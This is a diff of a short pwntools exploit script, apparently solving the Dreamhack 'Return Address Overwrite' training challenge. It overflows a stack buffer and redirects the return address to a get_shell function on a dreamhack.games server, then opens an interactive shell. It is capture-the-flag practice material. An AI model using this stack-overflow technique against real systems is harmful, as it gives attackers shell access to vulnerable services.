@@ -1,12 +1,13 @@
-from pwn import remote
+from pwn import *
 
-port = 24277
-rem = remote("host3.dreamhack.games", port)
+port = 17899
+rem = remote("host1.dreamhack.games", port)
 
-payload = b'A'*0x30        #|       buf      |  <= 'A'*0x30
-payload += b'B'*0x8        #|       SFP      |  <= 'B'*0x8
-payload += b'\xaa\x06\x40\x00\x00\x00\x00\x00'
+elf = ELF("./Pwnable/Return Address Overwrite/problem/rao")
 
-rem.sendline(payload)
+payload = b'A'*0x38 
+payload += p64(elf.symbols['get_shell'])
+
+rem.sendlineafter("Input: ", payload)
 
 rem.interactive()
